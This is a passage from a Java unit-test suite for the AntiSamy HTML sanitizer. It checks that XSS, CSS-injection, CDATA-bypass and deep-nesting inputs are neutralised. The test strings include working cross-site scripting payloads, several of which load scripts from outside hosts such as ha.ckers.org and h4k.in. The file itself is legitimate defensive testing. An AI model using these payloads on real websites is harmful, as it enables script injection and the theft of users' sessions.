        assertTrue(!as.scan("<SCRIPT a=`>` SRC=\"http://ha.ckers.org/xss.js\"></SCRIPT>", policy, AntiSamy.SAX)
                .getCleanHTML().contains("<script"));

        assertTrue(!as.scan("<SCRIPT a=\">'>\" SRC=\"http://ha.ckers.org/xss.js\"></SCRIPT>", policy, AntiSamy.DOM)
                .getCleanHTML().contains("<script"));
        assertTrue(!as.scan("<SCRIPT a=\">'>\" SRC=\"http://ha.ckers.org/xss.js\"></SCRIPT>", policy, AntiSamy.SAX)
                .getCleanHTML().contains("<script"));

        assertTrue(
                !as.scan("<SCRIPT>document.write(\"<SCRI\");</SCRIPT>PT SRC=\"http://ha.ckers.org/xss.js\"></SCRIPT>",
                        policy, AntiSamy.DOM).getCleanHTML().contains("script"));
        assertTrue(
                !as.scan("<SCRIPT>document.write(\"<SCRI\");</SCRIPT>PT SRC=\"http://ha.ckers.org/xss.js\"></SCRIPT>",
                        policy, AntiSamy.SAX).getCleanHTML().contains("script"));

        assertTrue(!as.scan("<SCRIPT SRC=http://ha.ckers.org/xss.js", policy, AntiSamy.DOM).getCleanHTML()
                .contains("<script"));
        assertTrue(!as.scan("<SCRIPT SRC=http://ha.ckers.org/xss.js", policy, AntiSamy.SAX).getCleanHTML()
                .contains("<script"));

        assertTrue(!as.scan(
                "<div/style=&#92&#45&#92&#109&#111&#92&#122&#92&#45&#98&#92&#105&#92&#110&#100&#92&#105&#110&#92&#103:&#92&#117&#114&#108&#40&#47&#47&#98&#117&#115&#105&#110&#101&#115&#115&#92&#105&#92&#110&#102&#111&#46&#99&#111&#46&#117&#107&#92&#47&#108&#97&#98&#115&#92&#47&#120&#98&#108&#92&#47&#120&#98&#108&#92&#46&#120&#109&#108&#92&#35&#120&#115&#115&#41&>",
                policy, AntiSamy.DOM).getCleanHTML().contains("style"));
        assertTrue(!as.scan(
                "<div/style=&#92&#45&#92&#109&#111&#92&#122&#92&#45&#98&#92&#105&#92&#110&#100&#92&#105&#110&#92&#103:&#92&#117&#114&#108&#40&#47&#47&#98&#117&#115&#105&#110&#101&#115&#115&#92&#105&#92&#110&#102&#111&#46&#99&#111&#46&#117&#107&#92&#47&#108&#97&#98&#115&#92&#47&#120&#98&#108&#92&#47&#120&#98&#108&#92&#46&#120&#109&#108&#92&#35&#120&#115&#115&#41&>",
                policy, AntiSamy.SAX).getCleanHTML().contains("style"));

        assertTrue(!as.scan(
                "<a href='aim: &c:\\windows\\system32\\calc.exe' ini='C:\\Documents and Settings\\All Users\\Start Menu\\Programs\\Startup\\pwnd.bat'>",
                policy, AntiSamy.DOM).getCleanHTML().contains("aim.exe"));
        assertTrue(!as.scan(
                "<a href='aim: &c:\\windows\\system32\\calc.exe' ini='C:\\Documents and Settings\\All Users\\Start Menu\\Programs\\Startup\\pwnd.bat'>",
                policy, AntiSamy.SAX).getCleanHTML().contains("aim.exe"));

        assertTrue(
                !as.scan("<!--\n<A href=\n- --><a href=javascript:alert:document.domain>test-->", policy, AntiSamy.DOM)
                        .getCleanHTML().contains("javascript"));
        assertTrue(
                !as.scan("<!--\n<A href=\n- --><a href=javascript:alert:document.domain>test-->", policy, AntiSamy.SAX)
                        .getCleanHTML().contains("javascript"));

        assertTrue(!as.scan(
                "<a></a style=\"\"xx:expr/**/ession(document.appendChild(document.createElement('script')).src='http://h4k.in/i.js')\">",
                policy, AntiSamy.DOM).getCleanHTML().contains("document"));
        assertTrue(!as.scan(
                "<a></a style=\"\"xx:expr/**/ession(document.appendChild(document.createElement('script')).src='http://h4k.in/i.js')\">",
                policy, AntiSamy.SAX).getCleanHTML().contains("document"));
    }

    /*
     * Test CSS protections.
     */

    @Test
    public void cssAttacks() throws ScanException, PolicyException {

        assertTrue(!as.scan("<div style=\"position:absolute\">", policy, AntiSamy.DOM).getCleanHTML()
                .contains("position"));
        assertTrue(!as.scan("<div style=\"position:absolute\">", policy, AntiSamy.SAX).getCleanHTML()
                .contains("position"));

        assertTrue(!as.scan("<style>b { position:absolute }</style>", policy, AntiSamy.DOM).getCleanHTML()
                .contains("position"));
        assertTrue(!as.scan("<style>b { position:absolute }</style>", policy, AntiSamy.SAX).getCleanHTML()
                .contains("position"));

        assertTrue(!as.scan("<div style=\"z-index:25\">test</div>", policy, AntiSamy.DOM).getCleanHTML()
                .contains("z-index"));
        assertTrue(!as.scan("<div style=\"z-index:25\">test</div>", policy, AntiSamy.SAX).getCleanHTML()
                .contains("z-index"));

        assertTrue(!as.scan("<style>z-index:25</style>", policy, AntiSamy.DOM).getCleanHTML().contains("z-index"));
        assertTrue(!as.scan("<style>z-index:25</style>", policy, AntiSamy.SAX).getCleanHTML().contains("z-index"));

    }

    /*
     * Test a bunch of strings that have tweaked the XML parsing capabilities of NekoHTML.
     */
    @Test
    public void IllegalXML() throws PolicyException {

        for (String BASE64_BAD_XML_STRING : BASE64_BAD_XML_STRINGS) {

            try {

                String testStr = new String(Base64.decodeBase64(BASE64_BAD_XML_STRING.getBytes()));
                as.scan(testStr, policy, AntiSamy.DOM);
                as.scan(testStr, policy, AntiSamy.SAX);

            }
            catch (ScanException ex) {
                // still success!
            }
        }

        // This fails due to a bug in NekoHTML
        // try {
        // assertTrue (
        // as.scan("<a . href=\"http://www.test.com\">",policy, AntiSamy.DOM).getCleanHTML().indexOf("href")
        // != -1 );
        // } catch (Exception e) {
        // e.printStackTrace();
        // fail("Couldn't parse malformed HTML: " + e.getMessage());
        // }

        // This fails due to a bug in NekoHTML
        // try {
        // assertTrue (
        // as.scan("<a - href=\"http://www.test.com\">",policy, AntiSamy.DOM).getCleanHTML().indexOf("href")
        // != -1 );
        // } catch (Exception e) {
        // e.printStackTrace();
        // fail("Couldn't parse malformed HTML: " + e.getMessage());
        // }

        try {
            assertTrue(as.scan("<style>", policy, AntiSamy.DOM) != null);
        }
        catch (Exception e) {
            e.printStackTrace();
            fail("Couldn't parse malformed HTML: " + e.getMessage());
        }
    }

    @Test
    public void issue12() throws ScanException, PolicyException {

        /*
         * issues 12 (and 36, which was similar). empty tags cause display problems/"formjacking"
         */

        Pattern p = Pattern.compile(".*<strong(\\s*)/>.*");
        String s1 =
                as.scan("<br ><strong></strong><a>hello world</a><b /><i/><hr>", policy, AntiSamy.DOM).getCleanHTML();
        String s2 =
                as.scan("<br ><strong></strong><a>hello world</a><b /><i/><hr>", policy, AntiSamy.SAX).getCleanHTML();

        assertFalse(p.matcher(s1).matches());

        p = Pattern.compile(".*<b(\\s*)/>.*");
        assertFalse(p.matcher(s1).matches());
        assertFalse(p.matcher(s2).matches());

        p = Pattern.compile(".*<i(\\s*)/>.*");
        assertFalse(p.matcher(s1).matches());
        assertFalse(p.matcher(s2).matches());

        assertTrue(s1.contains("<hr />") || s1.contains("<hr/>"));
        assertTrue(s2.contains("<hr />") || s2.contains("<hr/>"));
    }

    @Test
    public void issue20() throws ScanException, PolicyException {
        String s = as.scan("<b><i>Some Text</b></i>", policy, AntiSamy.DOM).getCleanHTML();
        assertTrue(!s.contains("<i />"));

        s = as.scan("<b><i>Some Text</b></i>", policy, AntiSamy.SAX).getCleanHTML();
        assertTrue(!s.contains("<i />"));
    }

    @Test
    public void issue25() throws ScanException, PolicyException {
        String s = "<div style=\"margin: -5em\">Test</div>";
        String expected = "<div style=\"\">Test</div>";

        String crDom = as.scan(s, policy, AntiSamy.DOM).getCleanHTML();
        assertEquals(crDom, expected);
        String crSax = as.scan(s, policy, AntiSamy.SAX).getCleanHTML();
        assertEquals(crSax, expected);
    }

    @Test
    public void issue28() throws ScanException, PolicyException {
        String s1 = as.scan("<div style=\"font-family: Geneva, Arial, courier new, sans-serif\">Test</div>", policy,
                AntiSamy.DOM).getCleanHTML();
        String s2 = as.scan("<div style=\"font-family: Geneva, Arial, courier new, sans-serif\">Test</div>", policy,
                AntiSamy.SAX).getCleanHTML();
        assertTrue(s1.contains("font-family"));
        assertTrue(s2.contains("font-family"));
    }

    @Test
    public void issue29() throws ScanException, PolicyException {
        /* issue #29 - missing quotes around properties with spaces */
        String s = "<style type=\"text/css\"><![CDATA[P {\n	font-family: \"Arial Unicode MS\";\n}\n]]></style>";
        CleanResults cr = as.scan(s, policy, AntiSamy.DOM);
        assertEquals(s, cr.getCleanHTML());
    }

    @Test
    public void issue30() throws ScanException, PolicyException {

        String s = "<style type=\"text/css\"><![CDATA[P { margin-bottom: 0.08in; } ]]></style>";

        as.scan(s, policy, AntiSamy.DOM);
        CleanResults cr;

        /* followup - does the patch fix multiline CSS? */
        String s2 = "<style type=\"text/css\"><![CDATA[\r\nP {\r\n margin-bottom: 0.08in;\r\n}\r\n]]></style>";
        cr = as.scan(s2, policy, AntiSamy.DOM);
        assertEquals("<style type=\"text/css\"><![CDATA[P {\n\tmargin-bottom: 0.08in;\n}\n]]></style>",
                cr.getCleanHTML());

        /* next followup - does non-CDATA parsing still work? */

        String s3 = "<style>P {\n\tmargin-bottom: 0.08in;\n}\n";
        cr = as.scan(s3, policy.cloneWithDirective(Policy.USE_XHTML, "false"), AntiSamy.DOM);
        assertEquals("<style>P {\n\tmargin-bottom: 0.08in;\n}\n</style>\n", cr.getCleanHTML());
    }

    @Test
    public void isssue31() throws ScanException, PolicyException {

        String test = "<b><u><g>foo";
        Policy revised = policy.cloneWithDirective("onUnknownTag", "encode");
        CleanResults cr = as.scan(test, revised, AntiSamy.DOM);
        String s = cr.getCleanHTML();
        assertFalse(!s.contains("&lt;g&gt;"));
        s = as.scan(test, revised, AntiSamy.SAX).getCleanHTML();
        assertFalse(!s.contains("&lt;g&gt;"));

        Tag tag = policy.getTagByLowercaseName("b").mutateAction("encode");
        Policy policy1 = policy.mutateTag(tag);

        cr = as.scan(test, policy1, AntiSamy.DOM);
        s = cr.getCleanHTML();

        assertFalse(!s.contains("&lt;b&gt;"));

        cr = as.scan(test, policy1, AntiSamy.SAX);
        s = cr.getCleanHTML();

        assertFalse(!s.contains("&lt;b&gt;"));
    }

    @Test
    public void issue32() throws ScanException, PolicyException {
        /* issue #32 - nekos problem */
        String s = "<SCRIPT =\">\" SRC=\"\"></SCRIPT>";
        as.scan(s, policy, AntiSamy.DOM);
        as.scan(s, policy, AntiSamy.SAX);
    }

    @Test
    public void issue37() throws ScanException, PolicyException {

        String dirty = "<a onblur=\"try {parent.deselectBloggerImageGracefully();}" + "catch(e) {}\""
                + "href=\"http://www.charityadvantage.com/ChildrensmuseumEaston/images/BookswithBill.jpg\"><img"
                + "style=\"FLOAT: right; MARGIN: 0px 0px 10px 10px; WIDTH: 150px; CURSOR:"
                + "hand; HEIGHT: 100px\" alt=\"\""
                + "src=\"http://www.charityadvantage.com/ChildrensmuseumEaston/images/BookswithBill.jpg\""
                + "border=\"0\" /></a><br />Poor Bill, couldn't make it to the Museum's <span"
                + "class=\"blsp-spelling-corrected\" id=\"SPELLING_ERROR_0\">story time</span>"
                + "today, he was so busy shoveling! Well, we sure missed you Bill! So since"
                + "ou were busy moving snow we read books about snow. We found a clue in one"
                + "book which revealed a snowplow at the end of the story - we wish it had"
                + "driven to your driveway Bill. We also read a story which shared fourteen"
                + "<em>Names For Snow. </em>We'll catch up with you next week....wonder which"
                + "hat Bill will wear?<br />Jane";

        Policy mySpacePolicy = Policy.getInstance(getClass().getResource("/antisamy-myspace.xml"));
        CleanResults cr = as.scan(dirty, mySpacePolicy, AntiSamy.DOM);
        assertNotNull(cr.getCleanHTML());
        cr = as.scan(dirty, mySpacePolicy, AntiSamy.SAX);
        assertNotNull(cr.getCleanHTML());

        Policy ebayPolicy = Policy.getInstance(getClass().getResource("/antisamy-ebay.xml"));
        cr = as.scan(dirty, ebayPolicy, AntiSamy.DOM);
        assertNotNull(cr.getCleanHTML());
        cr = as.scan(dirty, mySpacePolicy, AntiSamy.SAX);
        assertNotNull(cr.getCleanHTML());

        Policy slashdotPolicy = Policy.getInstance(getClass().getResource("/antisamy-slashdot.xml"));
        cr = as.scan(dirty, slashdotPolicy, AntiSamy.DOM);
        assertNotNull(cr.getCleanHTML());
        cr = as.scan(dirty, slashdotPolicy, AntiSamy.SAX);
        assertNotNull(cr.getCleanHTML());
    }

    @Test
    public void issue38() throws ScanException, PolicyException {

        /* issue #38 - color problem/color combinations */
        String s = "<font color=\"#fff\">Test</font>";
        String expected = "<font color=\"#fff\">Test</font>";
        assertEquals(as.scan(s, policy, AntiSamy.DOM).getCleanHTML(), expected);
        assertEquals(as.scan(s, policy, AntiSamy.SAX).getCleanHTML(), expected);

        s = "<div style=\"color: #fff\">Test 3 letter code</div>";
        expected = "<div style=\"color: rgb(255,255,255);\">Test 3 letter code</div>";
        assertEquals(as.scan(s, policy, AntiSamy.DOM).getCleanHTML(), expected);
        assertEquals(as.scan(s, policy, AntiSamy.SAX).getCleanHTML(), expected);

        s = "<font color=\"red\">Test</font>";
        expected = "<font color=\"red\">Test</font>";
        assertEquals(as.scan(s, policy, AntiSamy.DOM).getCleanHTML(), expected);
        assertEquals(as.scan(s, policy, AntiSamy.SAX).getCleanHTML(), expected);

        s = "<font color=\"neonpink\">Test</font>";
        expected = "<font>Test</font>";
        assertEquals(as.scan(s, policy, AntiSamy.DOM).getCleanHTML(), expected);
        assertEquals(as.scan(s, policy, AntiSamy.SAX).getCleanHTML(), expected);

        s = "<font color=\"#0000\">Test</font>";
        expected = "<font>Test</font>";
        assertEquals(as.scan(s, policy, AntiSamy.DOM).getCleanHTML(), expected);
        assertEquals(as.scan(s, policy, AntiSamy.SAX).getCleanHTML(), expected);

        s = "<div style=\"color: #0000\">Test</div>";
        expected = "<div style=\"\">Test</div>";
        assertEquals(as.scan(s, policy, AntiSamy.DOM).getCleanHTML(), expected);
        assertEquals(as.scan(s, policy, AntiSamy.SAX).getCleanHTML(), expected);

        s = "<font color=\"#000000\">Test</font>";
        expected = "<font color=\"#000000\">Test</font>";
        assertEquals(as.scan(s, policy, AntiSamy.DOM).getCleanHTML(), expected);
        assertEquals(as.scan(s, policy, AntiSamy.SAX).getCleanHTML(), expected);

        s = "<div style=\"color: #000000\">Test</div>";
        expected = "<div style=\"color: rgb(0,0,0);\">Test</div>";
        assertEquals(as.scan(s, policy, AntiSamy.DOM).getCleanHTML(), expected);
        assertEquals(as.scan(s, policy, AntiSamy.SAX).getCleanHTML(), expected);

        /*
         * This test case was failing because of the following code from the batik CSS library, which throws an
         * exception if any character other than a '!' follows a beginning token of '<'. The ParseException is now
         * caught in the node a CssScanner.java and the outside AntiSamyDOMScanner.java. 0398 nextChar(); 0399 if
         * (current != '!') { 0400 throw new ParseException("character", 0401 reader.getLine(), 0402
         * reader.getColumn());
         */
        s = "<b><u>foo<style><script>alert(1)</script></style>@import 'x';</u>bar";
        as.scan(s, policy, AntiSamy.DOM);
        as.scan(s, policy, AntiSamy.SAX);

    }

    @Test
    public void issue40() throws ScanException, PolicyException {

        /* issue #40 - handling <style> media attributes right */

        String s = "<style media=\"print, projection, screen\"> P { margin: 1em; }</style>";
        Policy revised = policy.cloneWithDirective(Policy.PRESERVE_SPACE, "true");

        CleanResults cr = as.scan(s, revised, AntiSamy.DOM);
        // System.out.println("here: " + cr.getCleanHTML());
        assertTrue(cr.getCleanHTML().contains("print, projection, screen"));
        // System.out.println(cr.getCleanHTML());

        cr = as.scan(s, revised, AntiSamy.SAX);
        // System.out.println(cr.getCleanHTML());
        assertTrue(cr.getCleanHTML().contains("print, projection, screen"));

    }

    @Test
    public void issue41() throws ScanException, PolicyException {
        /* issue #41 - comment handling */

        Policy revised = policy.cloneWithDirective(Policy.PRESERVE_SPACE, "true");

        policy.cloneWithDirective(Policy.PRESERVE_COMMENTS, "false");

        assertEquals("text ", as.scan("text <!-- comment -->", revised, AntiSamy.DOM).getCleanHTML());
        assertEquals("text ", as.scan("text <!-- comment -->", revised, AntiSamy.SAX).getCleanHTML());

        Policy revised2 = policy.cloneWithDirective(Policy.PRESERVE_COMMENTS, "true")
                .cloneWithDirective(Policy.PRESERVE_SPACE, "true").cloneWithDirective(Policy.FORMAT_OUTPUT, "false");

        /*
         * These make sure the regular comments are kept alive and that conditional comments are ripped out.
         */
        assertEquals("<div>text <!-- comment --></div>",
                as.scan("<div>text <!-- comment --></div>", revised2, AntiSamy.DOM).getCleanHTML());
        assertEquals("<div>text <!-- comment --></div>",
                as.scan("<div>text <!-- comment --></div>", revised2, AntiSamy.SAX).getCleanHTML());

        assertEquals("<div>text <!-- comment --></div>",
                as.scan("<div>text <!--[if IE]> comment <[endif]--></div>", revised2, AntiSamy.DOM).getCleanHTML());
        assertEquals("<div>text <!-- comment --></div>",
                as.scan("<div>text <!--[if IE]> comment <[endif]--></div>", revised2, AntiSamy.SAX).getCleanHTML());

        /*
         * Check to see how nested conditional comments are handled. This is not very clean but the main goal is to
         * avoid any tags. Not sure on encodings allowed in comments.
         */
        String input = "<div>text <!--[if IE]> <!--[if gte 6]> comment <[endif]--><[endif]--></div>";
        String expected = "<div>text <!-- <!-- comment -->&lt;[endif]--&gt;</div>";
        String output = as.scan(input, revised2, AntiSamy.DOM).getCleanHTML();
        assertEquals(expected, output);

        input = "<div>text <!--[if IE]> <!--[if gte 6]> comment <[endif]--><[endif]--></div>";
        expected = "<div>text <!-- <!-- comment -->&lt;[endif]--&gt;</div>";
        output = as.scan(input, revised2, AntiSamy.SAX).getCleanHTML();

        assertEquals(expected, output);

        /*
         * Regular comment nested inside conditional comment. Test makes sure
         */
        assertEquals("<div>text <!-- <!-- IE specific --> comment &lt;[endif]--&gt;</div>",
                as.scan("<div>text <!--[if IE]> <!-- IE specific --> comment <[endif]--></div>", revised2, AntiSamy.DOM)
                        .getCleanHTML());

        /*
         * These play with whitespace and have invalid comment syntax.
         */
        assertEquals("<div>text <!-- \ncomment --></div>",
                as.scan("<div>text <!-- [ if lte 6 ]>\ncomment <[ endif\n]--></div>", revised2, AntiSamy.DOM)
                        .getCleanHTML());
        assertEquals("<div>text  comment </div>",
                as.scan("<div>text <![if !IE]> comment <![endif]></div>", revised2, AntiSamy.DOM).getCleanHTML());
        assertEquals("<div>text  comment </div>",
                as.scan("<div>text <![ if !IE]> comment <![endif]></div>", revised2, AntiSamy.DOM).getCleanHTML());

        String attack = "[if lte 8]<script>";
        String spacer = "<![if IE]>";

        StringBuilder sb = new StringBuilder();

        sb.append("<div>text<!");

        for (int i = 0; i < attack.length(); i++) {
            sb.append(attack.charAt(i));
            sb.append(spacer);
        }

        sb.append("<![endif]>");

        String s = sb.toString();

        assertTrue(!as.scan(s, revised2, AntiSamy.DOM).getCleanHTML().contains("<script"));
        assertTrue(!as.scan(s, revised2, AntiSamy.SAX).getCleanHTML().contains("<script"));

    }

    @Test
    public void issue44() throws ScanException, PolicyException {
        /*
         * issue #44 - childless nodes of non-allowed elements won't cause an error
         */
        String s = "<iframe src='http://foo.com/'></iframe>" + "<script src=''></script>" + "<link hrefs='/foo.css'>";
        as.scan(s, policy, AntiSamy.DOM);
        assertEquals(as.scan(s, policy, AntiSamy.DOM).getNumberOfErrors(), 2);

        CleanResults cr = as.scan(s, policy, AntiSamy.SAX);

        assertEquals(cr.getNumberOfErrors(), 3);
    }

    @Test
    public void issue51() throws ScanException, PolicyException {
        /* issue #51 - offsite urls with () are found to be invalid */
        String s = "<a href='http://subdomain.domain/(S(ke0lpq54bw0fvp53a10e1a45))/MyPage.aspx'>test</a>";
        CleanResults cr = as.scan(s, policy, AntiSamy.DOM);

        // System.out.println(cr.getCleanHTML());
        assertEquals(cr.getNumberOfErrors(), 0);

        cr = as.scan(s, policy, AntiSamy.SAX);
        assertEquals(cr.getNumberOfErrors(), 0);
    }

    @Test
    public void isssue56() throws ScanException, PolicyException {
        /* issue #56 - unnecessary spaces */

        String s = "<SPAN style='font-weight: bold;'>Hello World!</SPAN>";
        String expected = "<span style=\"font-weight: bold;\">Hello World!</span>";

        CleanResults cr = as.scan(s, policy, AntiSamy.DOM);
        String s2 = cr.getCleanHTML();

        assertEquals(expected, s2);

        cr = as.scan(s, policy, AntiSamy.SAX);
        s2 = cr.getCleanHTML();

        assertEquals(expected, s2);
    }

    @Test
    public void issue58() throws ScanException, PolicyException {
        /* issue #58 - input not in list of allowed-to-be-empty tags */
        String s = "tgdan <input/> g  h";
        CleanResults cr = as.scan(s, policy, AntiSamy.DOM);
        assertTrue(cr.getErrorMessages().size() == 0);

        cr = as.scan(s, policy, AntiSamy.SAX);
        assertTrue(cr.getErrorMessages().size() == 0);
    }

    @Test
    public void issue61() throws ScanException, PolicyException {
        /* issue #61 - input has newline appended if ends with an accepted tag */
        String dirtyInput = "blah <b>blah</b>.";
        Policy revised = policy.cloneWithDirective(Policy.FORMAT_OUTPUT, "false");
        CleanResults cr = as.scan(dirtyInput, revised, AntiSamy.DOM);
        assertEquals(dirtyInput, cr.getCleanHTML());

        cr = as.scan(dirtyInput, revised, AntiSamy.SAX);
        assertEquals(dirtyInput, cr.getCleanHTML());
    }

    @Test
    public void issue69() throws ScanException, PolicyException {

        /* issue #69 - char attribute should allow single char or entity ref */

        String s = "<table><tr><td char='.'>test</td></tr></table>";
        CleanResults crDom = as.scan(s, policy, AntiSamy.DOM);
        CleanResults crSax = as.scan(s, policy, AntiSamy.SAX);
        String domValue = crDom.getCleanHTML();
        String saxValue = crSax.getCleanHTML();
        assertTrue(domValue.contains("char"));
        assertTrue(saxValue.contains("char"));

        s = "<table><tr><td char='..'>test</td></tr></table>";
        assertTrue(!as.scan(s, policy, AntiSamy.DOM).getCleanHTML().contains("char"));
        assertTrue(!as.scan(s, policy, AntiSamy.SAX).getCleanHTML().contains("char"));

        s = "<table><tr><td char='&quot;'>test</td></tr></table>";
        assertTrue(as.scan(s, policy, AntiSamy.DOM).getCleanHTML().contains("char"));
        assertTrue(as.scan(s, policy, AntiSamy.SAX).getCleanHTML().contains("char"));

        s = "<table><tr><td char='&quot;a'>test</td></tr></table>";
        assertTrue(!as.scan(s, policy, AntiSamy.DOM).getCleanHTML().contains("char"));
        assertTrue(!as.scan(s, policy, AntiSamy.SAX).getCleanHTML().contains("char"));

        s = "<table><tr><td char='&quot;&amp;'>test</td></tr></table>";
        assertTrue(!as.scan(s, policy, AntiSamy.DOM).getCleanHTML().contains("char"));
        assertTrue(!as.scan(s, policy, AntiSamy.SAX).getCleanHTML().contains("char"));
    }

    @Test
    public void CDATAByPass() throws ScanException, PolicyException {
        String malInput = "<![CDATA[]><script>alert(1)</script>]]>";
        CleanResults crd = as.scan(malInput, policy, AntiSamy.DOM);
        CleanResults crs = as.scan(malInput, policy, AntiSamy.SAX);
        String crDom = crd.getCleanHTML();
        String crSax = crs.getCleanHTML();

        assertTrue(crd.getErrorMessages().size() > 0);
        assertTrue(crs.getErrorMessages().size() > 0);

        assertTrue(crSax.contains("&lt;script") && !crDom.contains("<script"));
        assertTrue(crDom.contains("&lt;script") && !crDom.contains("<script"));

    }

    @Test
    public void literalLists() throws ScanException, PolicyException {

        /*
         * this test is for confirming literal-lists work as advertised. it turned out to be an invalid / non-
         * reproducible bug report but the test seemed useful enough to keep.
         */
        String malInput = "hello<p align='invalid'>world</p>";

        CleanResults crd = as.scan(malInput, policy, AntiSamy.DOM);
        String crDom = crd.getCleanHTML();
        CleanResults crs = as.scan(malInput, policy, AntiSamy.SAX);
        String crSax = crs.getCleanHTML();

        assertTrue(!crSax.contains("invalid"));
        assertTrue(!crDom.contains("invalid"));

        assertTrue(crd.getErrorMessages().size() == 1);
        assertTrue(crs.getErrorMessages().size() == 1);

        String goodInput = "hello<p align='left'>world</p>";
        crDom = as.scan(goodInput, policy, AntiSamy.DOM).getCleanHTML();
        crSax = as.scan(goodInput, policy, AntiSamy.SAX).getCleanHTML();

        assertTrue(crSax.contains("left"));
        assertTrue(crDom.contains("left"));
    }

    @Test
    public void stackExhaustion() throws ScanException, PolicyException {
        /*
         * Test Julian Cohen's stack exhaustion bug.
         */

        StringBuilder sb = new StringBuilder();
        for (int i = 0; i < 249; i++) {
            sb.append("<div>");
        }
        /*
         * First, make sure this attack is useless against the SAX parser.
         */
        as.scan(sb.toString(), policy, AntiSamy.SAX);

        /*
         * Scan this really deep tree (depth=249, 1 less than the max) and make sure it doesn't blow up.
         */

        CleanResults crd = as.scan(sb.toString(), policy, AntiSamy.DOM);

        String crDom = crd.getCleanHTML();
        assertTrue(crDom.length() != 0);
        /*
         * Now push it over the limit to 251 and make sure we blow up safely.
         */
        sb.append("<div><div>"); // this makes 251

        try {
            as.scan(sb.toString(), policy, AntiSamy.DOM);
            // fail("DOM depth exceeded max - should've errored");
        }
        catch (ScanException e) {

        }
    }

    @Test
    public void issue107() throws ScanException, PolicyException {
        StringBuilder sb = new StringBuilder();

        /*
         * #107 - erroneous newlines appearing? couldn't reproduce this error but the test seems worthy of keeping.
         */
        String nl = "\n";

        String header = "<h1>Header</h1>";
        String para = "<p>Paragraph</p>";
        sb.append(header);
        sb.append(nl);
        sb.append(para);

        String html = sb.toString();

        String crDom = as.scan(html, policy, AntiSamy.DOM).getCleanHTML();
        String crSax = as.scan(html, policy, AntiSamy.SAX).getCleanHTML();

        /* Make sure only 1 newline appears */
        assertTrue(crDom.lastIndexOf(nl) == crDom.indexOf(nl));
        assertTrue(crSax.lastIndexOf(nl) == crSax.indexOf(nl));

        int expectedLoc = header.length();
        int actualLoc = crSax.indexOf(nl);
        assertTrue(expectedLoc == actualLoc);

        actualLoc = crDom.indexOf(nl);
        // account for line separator length difference across OSes.
        assertTrue(expectedLoc == actualLoc || expectedLoc == actualLoc + 1);
    }

    @Test
    public void issue112() throws ScanException, PolicyException {
        TestPolicy revised = policy.cloneWithDirective(Policy.PRESERVE_COMMENTS, "true")
                .cloneWithDirective(Policy.PRESERVE_SPACE, "true").cloneWithDirective(Policy.FORMAT_OUTPUT, "false");
        StringBuilder sb;

        /*
         * #112 - empty tag becomes self closing
         */

        String html = "text <strong></strong> text <strong><em></em></strong> text";

        String crDom = as.scan(html, revised, AntiSamy.DOM).getCleanHTML();
        String crSax = as.scan(html, revised, AntiSamy.SAX).getCleanHTML();

        assertTrue(!crDom.contains("<strong />") && !crDom.contains("<strong/>"));
        assertTrue(!crSax.contains("<strong />") && !crSax.contains("<strong/>"));

        sb = new StringBuilder();
        sb.append("<html><head><title>foobar</title></head><body>");
        sb.append("<img src=\"http://foobar.com/pic.gif\" /></body></html>");

        html = sb.toString();

        Policy aTrue = revised.cloneWithDirective(Policy.USE_XHTML, "true");
        crDom = as.scan(html, aTrue, AntiSamy.DOM).getCleanHTML();
        crSax = as.scan(html, aTrue, AntiSamy.SAX).getCleanHTML();

        assertTrue(html.equals(crDom));
        assertTrue(html.equals(crSax));
    }

    @Test
    public void nestedCdataAttacks() throws ScanException, PolicyException {
        /*
         * #112 - empty tag becomes self closing
         */

        /*
         * Testing for nested CDATA attacks against the SAX parser.
         */

        String html = "<![CDATA[]><script>alert(1)</script><![CDATA[]>]]><script>alert(2)</script>>]]>";
        String crDom = as.scan(html, policy, AntiSamy.DOM).getCleanHTML();
        String crSax = as.scan(html, policy, AntiSamy.SAX).getCleanHTML();
        assertTrue(!crDom.contains("<script>"));
        assertTrue(!crSax.contains("<script>"));
    }

    @Test
    public void issue101InternationalCharacterSupport() throws ScanException, PolicyException {
        Policy revised = policy.cloneWithDirective(Policy.ENTITY_ENCODE_INTL_CHARS, "false");

        String html = "<b>letter 'a' with umlaut: \u00e4";
        String crDom = as.scan(html, revised, AntiSamy.DOM).getCleanHTML();
        String crSax = as.scan(html, revised, AntiSamy.SAX).getCleanHTML();
        assertTrue(crDom.contains("\u00e4"));
        assertTrue(crSax.contains("\u00e4"));

        Policy revised2 = policy.cloneWithDirective(Policy.USE_XHTML, "false")
                .cloneWithDirective(Policy.ENTITY_ENCODE_INTL_CHARS, "true");
        crDom = as.scan(html, revised2, AntiSamy.DOM).getCleanHTML();
        crSax = as.scan(html, revised2, AntiSamy.SAX).getCleanHTML();
        assertTrue(!crDom.contains("\u00e4"));
        assertTrue(crDom.contains("&auml;"));
        assertTrue(!crSax.contains("\u00e4"));
        assertTrue(crSax.contains("&auml;"));

        Policy revised3 = policy.cloneWithDirective(Policy.USE_XHTML, "true")
                .cloneWithDirective(Policy.ENTITY_ENCODE_INTL_CHARS, "true");
        crDom = as.scan(html, revised3, AntiSamy.DOM).getCleanHTML();
        crSax = as.scan(html, revised3, AntiSamy.SAX).getCleanHTML();
        assertTrue(!crDom.contains("\u00e4"));
        assertTrue(crDom.contains("&auml;"));
        assertTrue(!crSax.contains("\u00e4"));
        assertTrue(crSax.contains("&auml;"));
    }

    @Test
    public void iframeAsReportedByOndrej() throws ScanException, PolicyException {
        String html = "<iframe></iframe>";

        Policy revised;

        Tag tag = new Tag("iframe", Collections.<String, Attribute> emptyMap(), Policy.ACTION_VALIDATE);
        revised = policy.addTagRule(tag);

        String crDom = as.scan(html, revised, AntiSamy.DOM).getCleanHTML();
        String crSax = as.scan(html, revised, AntiSamy.SAX).getCleanHTML();

        assertTrue(html.equals(crDom));
        assertTrue(html.equals(crSax));
    }

    /*
     * Tests cases dealing with nofollowAnchors directive. Assumes anchor tags have an action set to "validate" (may be
     * implicit) in the policy file.
     */
    public void nofollowAnchors() {

        try {

            // if we have activated nofollowAnchors
            String val = policy.getDirective(Policy.ANCHORS_NOFOLLOW);

            Policy revisedPolici = policy.cloneWithDirective(Policy.ANCHORS_NOFOLLOW, "true");

            // adds when not present

            assertTrue(as.scan("<a href=\"blah\">link</a>", revisedPolici, AntiSamy.DOM).getCleanHTML()
                    .contains("<a href=\"blah\" rel=\"nofollow\">link</a>"));
            assertTrue(as.scan("<a href=\"blah\">link</a>", revisedPolici, AntiSamy.SAX).getCleanHTML()
                    .contains("<a href=\"blah\" rel=\"nofollow\">link</a>"));

            // adds properly even with bad attr
